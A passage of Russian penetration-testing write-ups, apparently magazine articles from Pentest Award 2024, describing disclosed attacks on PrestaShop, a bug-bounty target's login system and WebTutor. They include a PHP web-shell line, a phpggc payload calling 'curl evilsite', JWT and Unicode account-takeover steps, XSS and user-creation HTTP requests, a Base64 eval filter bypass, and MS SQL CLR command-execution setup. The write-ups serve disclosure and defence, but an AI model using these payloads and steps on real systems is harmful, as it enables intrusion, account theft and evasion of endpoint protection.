  Но без базы завершить установку не выйдет, поэтому быстренько под‐
нимем свой сервис MySQL и укажем его при настройке PrestaShop.
   Завершаем установку, и вот мы владельцы сервиса и полностью контро‐
лируем его БД. Теперь никакие конкуренты не смогут угнать учетную запись.
  Но заканчивать на этом было бы преждевременно, нужно попробовать
раскрутить эту уязвимость до RCE.
   Первое, что приходит на ум по аналогии с WordPress, — это зайти
как админ, скрафтить уязвимый плагин и установить его. Давай посмотрим,
можно ли тут провернуть нечто такое.
   Чтобы никак не сломать инстанс приложения, я поднял точно такую же
версию у себя и все эксперименты сначала тестировал на ней. Номер версии
я выяснил еще при установке приложения.


RCE ЧЕРЕЗ ПЛАГИН

Первым делом я узнал, что панель админа в разных инсталлах PrestaShop
находится по разным адресам, потому что для установки требуется переиме‐
новать папку admin на сервере. Выходит, мы не можем просто дописать
в конце пути admin, как это делается в случае с другими CMS.
   Что ж, придется немного посканировать директории, но сначала я вручную
попробовал самые простые варианты и с первой попытки угадал правиль‐
ный — это был /admin1!





                    Окно входа в панель администратора

Данные учетки у нас уже есть, поскольку мы сами их задали при завершении
установки.
  В своей локальной копии приложения я без труда нашел возможность
устанавливать модули:


http://localhost:8080/admin1/index.php/modules/addons/modules/
catalog?_token=17fwQY9OYfPHB





Теперь нам нужен вредоносный модуль, который будет давать нам шелл. Я
начал смотреть, как работают плагины к PrestaShop, для этого скачал модуль
из магазина и сразу же заглянул в исходный код.
  По факту это ZIP-архив, внутри которого — код на PHP. Достаточно просто
изменить index.php, чтобы получить RCE.





                    Код index.php до изменения





                       Код после изменения

Добавляем вот такой кусочек — исполнение команд через параметр cmd:


if( isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']);
 system($cmd);  echo "</pre>"; die; };

Пакуем в ZIP и загружаем модуль — пока что в наш локальный инсталл.
   Исполнение кода доступно вот по такому адресу:


http://localhost:8080/modules/autoupgrade/index.php? cmd=whoami





                                        Успех!

Можно идти получать RCE на продакшене! Но тут меня ждала еще одна проб‐
лема. Чтобы администраторская панель работала, установочная директория
/install должна быть удалена.
   Я, вероятно, использовал другой способ установки приложения, поэтому
папка /install при установке автоматически удалилась, и я такой ошибки
не встретил. На продакшен‑сервере же она присутствует, и удалить ее невоз‐
можно, пока у нас нет шелла.
   Выходит, наша учетка бесполезна. Но у нас еще остается доступ к базе
данных! Мы ведь ее контролируем полностью, поэтому можем не только
читать данные, но и записывать. Давай посмотрим, что из этого можно
выжать.


RCE ЧЕРЕЗ CACHE ENGINE DESERIALIZATION (?)

Поскольку у нас есть исходный код для этой CMS, можно посмотреть,
как приложение взаимодействует с базой данных и есть ли там баги. Самым
сочным багом, конечно же, было бы исполнение кода, так что искать будем
сразу с прицелом на это.
   Раз мы имеем дело с PHP, можем посмотреть, как реализована десери‐
ализация данных, поскольку там часто встречаются опасные уязвимости.
   Поискав по исходникам, находим кое‑что интересное вот здесь:


modules/ps_facetedsearch/src/Filters/Block.php:186





Тут в функцию десериализации передается значение, полученное из базы
данных. Давай разберемся, в каких условиях это происходит.
  С PrestaShop идет дефолтный модуль ps_facetedsearch, он находится
по пути modules/ps_facetedsearch.
   Этот модуль кеширует фильтры для поиска товаров. Как только поль‐
зователь создает фильтр (например, выбирает категорию), в базе данных
создается запись со значениями hash — хеш фильтра — и data — сериали‐
зованный объект (настройки фильтра).
   Вот как это выглядит в базе.





При обновлении страницы модуль ищет значение data по этому хешу и его
десериализует. Соответственно, имея доступ к базе данных, мы можем
заменить этот сериализованный объект своим и проэксплуатировать десери‐
ализацию.
   Далее нам необходимо найти гаджет.


ДЕСЕРИАЛИЗАЦИЯ ГАДЖЕТОВ PHP

Смотрим исходный код модулей и документацию.

      From the 1.7.6 version of PrestaShop we integrate support of Doctrine
       services and entities for modules. Doctrine is a powerful ORM allowing you«
       to manage your database data via objects.                »
Наша версия — 1.7.8.9, а значит, есть поддержка Doctrine.
   Пробуем гаджеты для Doctrine из phpggc и находим необходимый —
Doctrine/RCE2.
   Вот и всё! У нас есть возможность записать свое значение в базу данных,
вызвать десериализацию и получить шелл в системе.


ЭКСПЛУАТАЦИЯ

Теперь по каждому шагу эксплуатации.
   Сначала нужно убедиться, что база данных для кеш‑модуля пустая.





Заходим в приложение.





Выставляем фильтр для поиска (поставили галку).





Убедимся, что в базе появились записи для кеша.





Подготовим нагрузку из phpggc:


docker run phpggc7.4 Doctrine/RCE2 system 'curl evilsite'

В базе  данных  изменим  значение data  на наш  пейлоад  в  таблице
prestashop.ps_layered_filter_block.





Обновим страницу и получим исполнение кода.





Мы успешно получаем подключение к подконтрольному серверу (исполнение
через curl).





Повторили это на проде и получили RCE!


ОТВЕТСТВЕННОЕ РАЗГЛАШЕНИЕ

Я связался с командой безопасности PrestaShop и сообщил детали второй
уязвимости, поскольку для первого кейса через загрузку модулей это RCE by
design.
  Для второго кейса они решили не устранять уязвимость и были не против
публикации информации. Поэтому и ты теперь в курсе!
COVERSTORY





В конце 2023 года я участвовал в прог‐
рамме багбаунти одной крупной россий‐
ской  компании.  Комбинируя  логические
ошибки, я смог  проэксплуатировать баг,
который позволяет захватить любой акка‐                  arkiix
унт. В этой статье я расскажу, как проходи‐
ло исследование и какие трюки мне помог‐
ли добиться результата.


К сожалению, я не получил согласие на разглашение от компании, однако
уязвимость уже устранена. Так что опишу ход тестирования, не называя
заказчика.


Pentest Award
Этот текст получил премию Pentest Award 2024 в категории Hack the logic, пос‐
вященной поиску логических уязвимостей. Это соревнование ежегодно про‐
водится компанией Awillix.



           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ПЕРВЫЙ ACCOUNT TAKEOVER

При изучении сервиса я нашел несколько интересных аномалий:
 • При смене email в настройках профиля доступ к новому адресу не про‐
   веряется.
 • При регистрации пользователя и логине в его аккаунт API приводит
   переданный email к нижнему регистру. Но при смене email в настройках
   профиля он не подвергается никаким изменениям и успешно проходит
   проверку  уникальности, даже если  существует близнец с символами
   в ином регистре.
 • При исследовании JWT, который используется для авторизации поль‐
   зователя, я выяснил, что роль идентификатора пользователя играет email
   (так как это единственный идентификатор пользователя в пейлоаде JWT).

Получается, что если у почтового адреса есть близнец, то владелец такой
почты  потенциально  сможет  подделать  токен  другого  пользователя
и получить сессию от его имени.





Пример пейлоада JWT
Первым делом нужно было понять, что произойдет, если будет существовать
несколько email-близнецов с символами в разных регистрах и мы попробуем
использовать их для логина.
   Чтобы разобраться, что происходит на бэкенде сервиса, я создал два
аккаунта и email второго поменял на email первого через баг в настройке про‐
филя, предварительно изменив регистр некоторых букв. При этом пароли
у аккаунтов были разными.
  При попытке войти с данными первого пользователя (того, который был
зарегистрирован раньше) мы успешно попадаем в его аккаунт. Если же
использовать  данные  второго  пользователя,  получаем  ошибку  Invalid
Credentials.
   Дальше я создал аккаунт и через уязвимость на странице изменения про‐
филя поменял некоторые символы в адресе почты на аналогичные в ином
регистре. Зарегистрироваться с таким адресом не получилось бы — сервер
в этом случае автоматически приводит буквы к нижнему регистру.
   После аутентификации я успешно зашел в аккаунт, а в JWT адрес почты
оказался приведен к нижнем регистру.
  Из этих тестов стало известно:
 • При аутентификации хранимый в таблице email приводится к нижнему
   регистру.
 • Получается зайти только в более старый аккаунт, значит, существует сор‐
   тировка, а API выбирает первую запись из тех, что вернул запрос к БД (ну
   или используется LIMIT 1 в SQL-запросе).
 • После аутентификации в аккаунте, email которого содержит буквы разного
   регистра, возвращаемый сервером JWT содержит email в нижнем регис‐
   тре.

На основе этих фактов я составил возможный SQL-запрос, который выпол‐
няется при логине. Это помогает восстановить логику работы сервера.





Используя эти знания, я смог получить доступ к более новому аккаунту жер‐
твы, чем аккаунт атакующего. Для этого понадобилось:
 1. Изменить email аккаунта атакующего на email жертвы через редактирова‐
   ние профиля: я заменил некоторые буквы аналогичными в ином регистре.
 2. Залогиниться с помощью мейла жертвы и пароля атакующего (после
   аутентификации попадаем в аккаунт атакующего, так как он более старый).
 3. Изменить email аккаунта атакующего на любой другой, предварительно
   сохранив наш JWT.
 4. Поместить JWT обратно в куки и обновить страницу.

Таким образом попадаем в аккаунт жертвы, так как теперь это самый старый
аккаунт с такой почтой, да и в принципе единственный.
  Но  этого  недостаточно,  хочется иметь возможность получать  доступ
к любому аккаунту. Я начал искать способ на этапе аутентификации указать
сервису именно на аккаунт атакующего, который может быть новее, чем акка‐
унт жертвы. Пришла мысль протестировать вход в аккаунт по OAuth, поскольку
велика вероятность, что в таком случае идентификатором пользователя будет
целочисленный и уникальный User ID, а не email.
  И это сработало! После привязки аккаунта для входа с помощью OAuth
(для тестов я использовал Gmail) я мог успешно указать на аккаунт атакующе‐
го, даже если он новее, чем аккаунт жертвы. Следовательно, после логина я
получал JWT, с адресом почты в нижнем регистре, а так как самый старый
пользователь с таким email — это аккаунт жертвы (аккаунт атакующего соз‐
дается перед атакой), то я попадал в него.


Эксплуатация
Вот шаги, которые нужны для эксплуатации этого бага:
 1. Добавляем в нашу организацию сотрудника с любым адресом электрон‐
   ной почты.
 2. Переходим по ссылке, которая пришла на  почту новому  сотруднику,
   и устанавливаем пароль.
 3. Заходим в аккаунт нового сотрудника.
 4. В настройках профиля привязываем любой  аккаунт Gmail для аутен‐
   тификации через OAuth.
 5. Меняем наш email на адрес жертвы, заменив некоторые буквы аналогич‐
  ными в ином регистре (например, email жертвы test@mail.ru , тогда
   адрес атакующего может быть TeSt@mail.ru ).
 6. Выходим из аккаунта.
 7. Переходим на страницу https://redacted.domain/login.
 8. Входим с помощью аккаунта Gmail и попадаем в аккаунт и организацию
   жертвы.
 9. Для захвата аккаунта можем сменить почту на любую другую.


Рекомендации
 • Чтобы избежать дублирования одного почтового адреса в разных регис‐
   трах, в БД стоит использовать тип данных без учета регистра (например,
  citext в PostgreSQL) в сочетании с UNIQUE  Constraint. Или, если
   это невозможно, обновления данных в таблице проводить с помощью
   заранее подготовленного метода API или процедуры в БД, учитывающей
   возможную разницу регистра (чтобы исключить риск недостаточной про‐
   верки при разработке новых функций API).
 • В JWT стоит использовать идентификаторы пользователя, на которые он
   не может повлиять, например целочисленный User ID (судя по эндпоинтам
   обновления информации пользователей, он уже существует в БД).
 • Свести время действия access token к минимуму (на момент тестирования
   он жил не меньше суток), чтобы уменьшить эффективность возможного
   «провала» в чужой аккаунт.
 • При смене email пользователя запрашивать подтверждение путем отправ‐
   ки письма на старую почту.


ВТОРОЙ ACCOUNT TAKEOVER

Через некоторое время, уже после фикса, я вернулся протестировать сервис
и попробовать любыми способами добиться ATO снова.
   Аутентификация была изменена:
 • Выпилили аутентификацию через OAuth, с помощью которой я в прошлый
   раз смог указать аккаунт атакующего и добиться захвата любой учетки.
 • Появилась возможность запомнить вход в аккаунт.
 • Появились refresh-токены.

Интересно, кстати, что если перед входом в аккаунт активировать чекбокс
«Запомнить», то после истечения жизни нашего access token (JWT) он обно‐
вится с помощью refresh-токена, но в противном случае система его не обно‐
вит и нас выкинет из аккаунта.
   Конечно, первым делом я проверил фикс прошлой уязвимости: дуб‐
лировать  существующий  email  с помощью  изменения  регистра  букв
не получилось. Но я заметил, что в почтовом адресе можно подставлять сим‐
волы (далеко не все, но некоторые проходили из‑за недостаточной валида‐
ции), которые не могут в нем содержаться.
   Тогда я решил сделать ставку на возможную проблему с нормализацией
Unicode. Я пробовал заменять буквы символами, которые после нормализа‐
ции могут принять вид тех самых букв (например, U+212A → K), но тесты
не дали никаких результатов.
  Еще есть символы, которые после нормализации вообще пропадают. Я
собрал список управляющих символов Unicode, но беглый ручной тест не дал
никаких результатов, и я пришел к автоматизации с помощью Python.
   Запрос на изменение профиля я переписал на requests (кстати, удобно
это можно сделать с помощью расширения для Burp Suite, оно называется
Copy as Python Requests). Делаем запросы в цикле и подставляем в email
разные управляющие символы Unicode.





                Пример скрипта для перебора символов

Email с большинством символов не прошел проверку уникальности, а с
некоторыми прошел, но после нормализации эти символы остались в адресе.
В таком случае у нас выходит не дубликат адреса, а email с дописанным
непонятным символом.





        Пример результата с некоторыми управляющими символами

Но символ U+206A «симметричный обмен запрещен» стрельнул. Он обходил
проверку уникальности и после нормализации пропадал. Видимо, проверка
уникальности email проводилась до нормализации, а уже после нормализа‐
ции адрес пишется в БД. Так мне удалось повторно обойти ограничение уни‐
кальности email путем добавления этого символа (например, test@mail.ru
→ test\u206a@mail.ru).





                          Реконструкция запроса из PoC

Еще из прошлого теста известно, что, найдя способ создавать близнецов
email, можно получить доступ только к более новому аккаунту, чем наш.
В прошлый раз я обошел это с помощью указания на аккаунт через OAuth,
но после обновления сервиса эту возможность убрали.
  Я долго думал, как еще можно провернуть подобный трюк. Попробуем
уцепиться за возможность обновлять токен, описанную в начале. Я подумал,
что refresh token обязательно должен указывать на User ID и сможет взять
на себя роль OAuth из прошлой уязвимости. Но, чтобы протестировать это,
нужен  access  token,  срок  действия  которого  уже  истек.  Поскольку
для обновления access token не существует отдельного эндпоинта, сервер
в ответ на любой запрос к нему обновит токен, если срок жизни токена приб‐
лижается к концу или токен уже протух.
   «Если срок его жизни приближается к концу...» Звучит как место, куда мож‐
но воткнуть костыль! Заставлять триажера ждать, пока протухнет сессия,
не хотелось, поэтому я предположил, что проверка того, скоро ли умрет
токен, может выполняться до проверки самой подписи токена. Для теста я
составил специальный токен, из которого убрал все лишнее, оставил только
метку о том, что у нас был активирован чекбокс «Запомнить», ключу exp ука‐
зал значение 0, а подпись удалил.





           Токен, используемый для запуска механизма обновления

Каждый раз, когда на любой эндпоинт прилетал запрос с таким access-
токеном, сервер обновлял его с помощью refresh token.
   Чтобы проверить, может ли механизм обновления токенов поспособство‐
вать нам в захвате любого аккаунта, я сменил email пользователя через акка‐
унт администратора организации (больше нельзя было менять себе email
без подтверждения), в которой он находился, а после этого от лица поль‐
зователя послал GET-запрос (чтобы не тратить время на токены XSRF)
на первый попавшийся эндпоинт с заранее подготовленным протухшим
access-токеном. Сервер обновил access token, а в пейлоаде содержался
новый email. Значит, refresh token привязан к пользователю по User ID и мы
можем  использовать механизм  обновления  access-токена  для  захвата
любого аккаунта.


Эксплуатация
Пройдемся вкратце по основным шагам атаки:
 1. Входим в аккаунт администратора организации и создаем аккаунт ата‐
   кующего.
 2. Входим в аккаунт атакующего с активированным чекбоксом «Запомнить»
   (чтобы работал механизм обновления access token).
 3. С аккаунта администратора нашей организации обновляем атакующему
   email на адрес жертвы с символом U+206A (например, victim@mail.ru
 → victim\u206a@mail.ru ).
 4. В куки аккаунта атакующего помещаем заранее подготовленный прос‐
   роченный access token.
 5. Отправляем любой запрос на сервер с этим токеном (отправлял из Burp
   Repeater, но в целом можно просто обновить страницу) и получаем в отве‐
   те access token с email жертвы (victim@mail.ru ).
 6. Так как аккаунт жертвы самый старый среди аккаунтов с таким же email
   (аккаунт  атакующего  создается  непосредственно перед  атакой),  то
   с полученным access-токеном мы попадаем в аккаунт и организацию жер‐
   твы.


Рекомендации
Вот что нужно сделать, чтобы и такая атака была невозможна:
 • Доработать проверку почтового адреса, которая не должна позволять
   использование недопустимых символов.
 • Проверять уникальность адреса после нормализации.
 • Использовать ограничения уникальности (например, UNIQUE Constraint)
   в СУБД для атрибута email.
 • В JWT  использовать  идентификаторы  пользователя, на которые он
   не может повлиять, например целочисленный User ID (судя по эндпоинтам
   обновления информации пользователей, он уже существует в БД).
 • Если не планируется полностью менять механизм обновления токенов, то
   нужно хотя бы убедиться, что проверка того, как скоро истечет срок жизни
   access-токена, происходит после проверки подписи.
COVERSTORY





Мы проводили пентест одной большой ком‐
пании с хорошим бюджетом на ИБ и обна‐
ружили   баг   в   коробочном  решении
WebTutor. Эта уязвимость позволила нам
получить доступ во внутреннюю сеть, где              Danr0
мы  столкнулись  с EDR и  антивирусом.
Обойти их помогла возможность исполнять
команды из запросов к БД.


Pentest Award
Этот текст получил третье место на премии Pentest Award 2024 в категории
«Пробив web». Это соревнование ежегодно проводится компанией Awilix.


Здесь я не буду обсуждать весь ход работ — скоуп был большим, и в него
входило много самописных приложений и несколько коробочных. Расскажу
лишь об атаке на WebTutor — как о наиболее интересном моменте.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



АНАЛИЗ ИСХОДНЫХ КОДОВ (XSS И ЧТЕНИЕ ФАЙЛА)

Websoft HCM (ранее называлась WebTutor) — это система управления талан‐
тами, предлагающая инструменты подбора, обучения, оценки компетенций,
планирования карьеры, управления знаниями. Это коробочное решение,
которое  используется многими  компаниями для  автоматизации работы
по найму и обучению сотрудников.
   Встретив этот продукт в сети заказчика, мы решили его изучить под‐
робнее. Для этого можно скачать демоверсию, но в ней есть ряд ограничений
по сравнению с установленной на сервере полной. Зато доступны исходные
коды продукта, и они как раз идентичны той версии, что развернута у заказ‐
чика.
   Основное ограничение демоверсии — это возможность использовать
только файловую базу данных, но при этом все возможности приложения
работают. Сейчас демоверсия продукта предоставляется только по запросу.
  Для хранения данных приложение использует файловую базу данных
или Microsoft SQL в зависимости от настроек.
   После  установки находим в файловой системе  папку WebTutorAdmin
с веб‑сервером. В ней две папки: снова WebTutorAdmin, где лежит админка,
и WebTutorServer с прочими функциями сервера.
  Я поискал известные нам страницы (логин и регистрация) и понял, что все
файлы  HTML   из   папки  WebTutorServer/wt/web   доступны   через
веб‑интерфейс. Также в этой папке находятся файлы .xml и .bs, которые мож‐
но читать и выполнять через вызовы API.


             INFO

                       WebTutor написан на  языке  JScript.  JScript —
                        это реализация ECMAScript компании Microsoft.
                          Приложение также использует .NET Core и мно‐
                           жество DLL-библиотек. Для управления логикой
                          приложения  используются  три  типа  файлов:
                           .html — страницы с кодом  клиентской и сер‐
                      верной  части  вместе,  .xml и  .bs.  Последний
                            используется для описания методов API, которые
                          доступны в приложении. Файлы HTML в JScript
                        напоминают шаблоны PHP, где серверный код
                          чередуется с кодом страницы.


Доступ к большинству эндпоинтов API возможен без дополнительной авто‐
ризации, так как там есть проверка пользователя. В шаблонах HTML за про‐
верки сессии отвечают подгружаемые в начале скрипты:


Server.Execute( "include/user_init.html" );
Server.Execute( "include/host_init.html" );

После установки WebTutor регистрация включена. Однако на целевой системе
она недоступна, к тому же ограничен доступ к административным страницам.
Следовательно, нам нужно найти лазейку в доступных неавторизованному
пользователю шаблонах HTML.
   Быстро находим простую XSS вот в этом файле:


WebTutorAdmin/WebTutorServer/wt/web/replace_photo.html

Переменная URL берется из запроса и без всякой фильтрации вставляется
в код страницы.


<%
 try
 {
 _url = UrlDecode( Trim( Request.Form.GetProperty( "url" ) ) );
 //...
 <script type="text/javascript">
   location.href = "<%=_url%> ";
 </script>





                   Пример встраивания кода на JScript

Полный HTTP-запрос для XSS:


POST /replace_photo.html HTTP/1.1
Host: 10.3.89.104
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)
Gecko/20100101 Firefox/119.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,*/* ;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: SessionID=7303593220364327493
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
foto=1&url=1";alert(1);//

Перепроверяем все эндпоинты API без авторизации и находим метод /api/
spxml2/get_image. Он доступен и позволяет читать произвольные файлы
в системе.





                      Пример чтения файла win.ini


СОЗДАНИЕ НОВОГО ПОЛЬЗОВАТЕЛЯ В СИСТЕМЕ

Расширить зону поиска можно, например, получив учетную запись. Ищем
файлы, где происходит работа с пользователями, и находим возможность
изменения профиля в следующем файле:


WebTutorAdmin/WebTutorServer/wt/web/user_change.html

Из запроса берутся все данные и дальше сохраняются в БД, при этом
не делается  проверка на активную сессию. Хоть приложение ломается
при таком запросе и выдает 500, оно все равно успевает вызвать первый
блок кода, где выполняется сохранение пользователя в БД.
  Все параметры для создаваемого пользователя берутся из запроса, вклю‐
чая логин и пароль. Для создания незаблокированного пользователя необ‐
ходимо передать аргументы view=new без поля web_banned.


_login = tools_web.convert_xss(Request.Form.GetOptProperty("login",
""));
_password = tools_web.convert_xss(Request.Form.GetOptProperty("
password", ""));
_lastname = tools_web.convert_xss(Request.Form.GetOptProperty("
lastname", ""));
_firstname = tools_web.convert_xss(
  Request.Form.GetOptProperty("firstname", "")
);
_middlename = tools_web.convert_xss(
  Request.Form.GetOptProperty("middlename", "")
);
_position_name = tools_web.convert_xss(
  Request.Form.GetOptProperty("position_name", "")
);
_view = tools_web.convert_xss(Request.Form.GetOptProperty("view", "
self"));
_email = tools_web.convert_xss(Request.Form.GetOptProperty("email",
""));
_phone = tools_web.convert_xss(Request.Form.GetOptProperty("phone",
""));
_sex = tools_web.convert_xss(Request.Form.GetOptProperty("sex", ""));
//...
if (_view == "new") _web_banned = Request.Form.HasProperty("
web_banned");

Потом данные из поля передаются в новый объект пользователя, который
сохраняется в системе. И злоумышленник может выполнить вход от имени
этого пользователя.


if (errStr == '') {
  docUser = OpenNewDoc('x-local://wtv/wtv_collaborator.xmd');
  docUser.TopElem.login = _login;
  docUser.TopElem.password = tools.make_password(_password, false);
  docUser.TopElem.lastname = _lastname;
  docUser.TopElem.firstname = _firstname;
  docUser.TopElem.middlename = _middlename;
  docUser.TopElem.email = _email;
  docUser.TopElem.phone = _phone;
  docUser.TopElem.sex = _sex;
  docUser.TopElem.access.web_banned = _web_banned;
  docUser.TopElem.change_password = _change_password;
  //...
  docUser.BindToDb(DefaultDb);
  docUser.Save();





                     Создание нового пользователя

Полный HTTP-запрос для создания пользователя:


POST /user_change.html?ajax=1 HTTP/1.1
Host: 10.3.89.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;
q=0.7
Connection: close
Upgrade-Insecure-Requests: 1
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
DNT: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 215
login=danr0&password=P%40ss0rd_danr0&lastname=test&firstname=test&
middlename=te st&position_name=test&email=test%401.ru&phone=1&sex=1&
password2=P%40ss0rd_For_T 3st&sub_id=1&position=1&mode=1&
subdivision=1&view=new


ИСПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА ЧЕРЕЗ ИНЪЕКЦИЮ
КОМАНД

После создания пользователя и входа в систему получаем доступ к кон‐
фиденциальным данным, но нам нужна полная компрометация.
  Я продолжил изучать оставшиеся HTML и обратил внимание на функцию
safe_execution. Она  отвечает  за  фильтрацию  специальных  символов
и опасных функций.
   Уязвимость находим в следующем файле:


WebTutorAdmin/WebTutorServer/wt/web/document_save.html

На этой странице пользователь может передать в запросе имена и значения
полей для создаваемого документа. В этих полях допустимо использование
приставки [@formula] для подсчета значения по формуле. Если программа
найдет такую приставку, она вызовет функцию tools.safe_execution с дан‐
ными из запроса.
   Наша задача — найти способ внедрять произвольные команды в формулу,
чтобы дальше они попали в eval и были выполнены.


_sf = String(Request.Form.GetProperty(_source_fields)).split(";");
_df = String(Request.Form.GetProperty(_destination_fields)).split(";"
);
for (_z = 0; _z < ArrayCount(_sf); _z++) {
  if (_z >= ArrayCount(_df)) {
    sErrorInform += "Entry(" + _x + "): Document save. Not enough
data in destination_fields. Element: " + _z + "; ";
    break;
  }
  _fld = Trim(replaceFieldValue(_sf[_z]));
  if (_fld != "") {
    iPrefixTameRepeat = 0;
    while (iPrefixTameRepeat < 3) {
      if (StrBegins(StrLowerCase(_df[_z]), "[encoded]")) {
        _dfval = UrlDecode(String(_df[_z]).slice(9));
        _encoded = true;
        iPrefixTameRepeat += 2;
      } else {
        _dfval = replaceFieldValue(_df[_z]);
        _encoded = false;
      }
      if (StrBegins(_dfval, "[@formula]")) {
        _dfval = String(_dfval).slice(10);
        try {
          _dfval = tools.safe_execution(_dfval);
        } catch (_dfval) {
          _dfval = null;
        }
        iPrefixTameRepeat += 1;
      }

Функция safe_execution определена вот в этом файле:


WebTutorAdmin/WebTutorServer/wtv/wtv_tools.xml

Перед передачей аргумента в функцию eval производится фильтрация опас‐
ных функций по названиям.


<safe_execution
 PROPERTY="1"
 CALLER-ENV="1"
 PARAM="sCodeSaveExecutionParam"
 EXPR="
 if (sCodeSaveExecutionParam == "") return true;
 temp_arrCodeSaveExecution = [
   {
     name: "file function",
     arr: [
       "CreateDirectory",
       "CreateShellLink",
       "DeleteDirectory",
       "DeleteFile",
       "GetShellFo lderPath",
       "MoveFile",
       "ObtainDirectory",
       "ObtainSessionTempFile",
       "ObtainTempFile",
       "PutFileData",
       "PutFileText",
       "AddUrlMapping",
       "CopyUrl",
       "DeleteUrl",
       "PutUrlData",
       "PutUrlText",
     ],
   },
   {
     name: "function",
     arr: [
       "RemoveEmptySysRegKey",
       "RemoveSysRegKey",
       "SetSysRegIntegerValue",
       "SetSysRegStr Value",
       "SysRegKeyExists",
       "ProcessExecute",
       "ShellExecute",
       "DllWrapper",
       "ActiveXO bject",
     ],
   },
   {
     name: "execution function",
     arr: [
       "EvalCodeUrl",
       "EvalCodePage",
       "EvalCodePageUrl",
       "EvalCs",
       "InPlaceEval",
       "OptEval",
       "ServerEval",
       "EvalAsync",
       "EvalSync",
       "EvalCode",
     ],
   },
   { name: "tools function", arr: [] },
 ];
 for (temp_arrCodeSaveExecutionElem in temp_arrCodeSaveExecution) {
   for (sCodeSaveExecutionElem in temp_arrCodeSaveExecutionElem.arr)
{
     if (StrContains(sCodeSaveExecutionParam,
sCodeSaveExecutionElem)) {
       throw (
         "Error code execution. Invalid " +
         temp_arrCodeSaveExecutionElem.name +
         " " +
         sCodeSaveExecutionElem +
         "."
       );
       return;
     }
   }
 }
 for (sCodeSaveExecutionElem in [" ", "=", "(", ";", ",", "\t", "\n"
]) {
   for (sPostCodeSaveExecutionElem in ["(", " ("]) {
     if (
       StrContains(
         sCodeSaveExecutionParam,
         sCodeSaveExecutionElem + "eval" + sPostCodeSaveExecutionElem
       )
     ) {
       throw "Error code execution. Invalid Eval function.";
       return;
     }
   }
 }
 return eval(sCodeSaveExecutionParam);
 "
/>

Чтобы обойти проверку, нужно как‑то обфусцировать название функции. Нап‐
ример, можем закодировать его в Base64, а затем вызвать декодирование
и передать результат в eval:


eval (Base64Decode("
<base64_arbitary_code>"))"

Такой пейлоад позволяет вызывать любые функции в контексте приложения.
  На скриншоте ниже — просмотр установочной директории с помощью
уязвимости. Для вывода результата используется создание нового заголовка
в  ответе сервера (при дальнейшей  эксплуатации будет использоваться
заголовок x-msg: <base64_output>).





На целевой системе сразу исполнять произвольные команды не будем,
это может вызвать срабатывание антивируса. Вместо этого можем спокойно
использовать встроенные возможности веб‑приложения. С их помощью
просматриваем директории и действительно находим антивирус и агент EDR
известных производителей.
   Также по умолчанию все пароли пользователей хранятся в открытом виде,
поэтому можем извлечь их из БД, сохранить в файл и получить через
веб‑сервер.





ИСПОЛНЕНИЕ КОДА НА MS SQL ЧЕРЕЗ USER DEFINED FUNCTION

Так как на системе установлены хорошие системы безопасности, нужно их
обходить или же искать другой путь продвижения.
  На целевой системе используется не файловая БД, а Microsoft SQL.
При этом база данных располагается на другом хосте и имеет другие нас‐
тройки. Потенциально это позволяет нам перенести атаку на другой хост
без установленных защитных решений.
   Проверяем, что текущий пользователь приложения имеет роль sysadmin
в базе MS SQL. Для эксплуатации будем использовать расширенную про‐
цедуру на языке C# для базы данных MS SQL. Она позволяет выполнять про‐
извольные команды в операционной системе.
  Нам надо загрузить скомпилированную DLL на сервер и установить в виде
расширенной процедуры.
   Включаем опцию, разрешающую выполнение пользовательских CLR-сбо‐
рок:


sp_configure 'clr enabled', 1;

Через функцию sp_add_trusted_assembly на сервере добавляем хеш (SHA-
512) для «доверенной» сборки:


EXEC sp_add_trusted_assembly <SHA_512>,N'HttpDb, version=0.0.0.0,
culture=neutral, publickeytoken=null, processorarchitecture=msil';"

С помощью SQL-запроса создаем новую сборку и на ее основе регистри‐
руем функцию:


CREATE ASSEMBLY [mylib] AUTHORIZATION [dbo] <HEX> FROM WITH
PERMISSION_SET = UNSAFE";
CREATE FUNCTION [dbo].[http] (@url [nvarchar](MAX)) RETURNS [
nvarchar] (MAX) AS EXTERNAL NAME [HttpDb].[UserDefinedFunctions].[
http];

Так я добавил на сервер несколько CLR-процедур (HTTP DB, Trace), выпол‐
няющих листинг локальных директорий, команды ОС, HTTP-запросы и рас‐
паковку исполняемых файлов.





При анализе файловой системы БД я не нашел следов сторонних защитных
решений: в  системе  установлен  только Windows  Defender. Его можем
без проблем обойти или просто выключить с правами системы. Тем самым
получаем входную точку в компанию без необходимости обхода EDR-агента
и сторонних антивирусов.
  В итоге получаем такую последовательность: создание пользователя →
инъекция команд через eval → SQL-запрос → UDF → компрометация хоста
с БД.


Найденные уязвимости зарегистрированы в БДУ под следующими иден‐
тификаторами:
 • BDU:2024-00755
 • BDU:2023-08666
 • BDU:2024-00756
 • BDU:2024-00757




РЕКОМЕНДАЦИИ ПО УСТРАНЕНИЮ

Все проблемы были устранены в более новых версиях продукта. Тем ком‐
